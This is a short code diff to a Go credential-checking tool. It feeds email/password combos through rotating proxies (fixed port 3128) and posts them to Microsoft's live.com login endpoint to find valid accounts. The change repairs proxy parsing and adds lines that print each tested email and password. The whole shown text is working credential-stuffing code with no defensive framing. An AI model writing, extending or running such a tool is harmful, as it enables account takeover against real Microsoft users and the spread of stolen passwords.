@@ -104,8 +104,9 @@ func checkCredentials(comboChannel chan string, proxies []string, validChannel, 
 // checkWithProxy checks the credentials using the given proxy
 func checkWithProxy(email, password, proxy string) (*http.Response, error) {
 	// Define the proxy URL
-	proxyURL, err := url.Parse(proxy)
+	proxyURL, err := url.Parse(fmt.Sprintf("http://%s:%d", proxy, 3128))
 	if err != nil {
+		fmt.Println("Parse Error", err)
 		return nil, err
 	}
 
@@ -116,6 +117,7 @@ func checkWithProxy(email, password, proxy string) (*http.Response, error) {
 		},
 	}
 
+	fmt.Println("Credential", email, password)
 	return client.PostForm("https://login.live.com/login.srf", map[string][]string{
 		"login":  {email},
 		"passwd": {password},
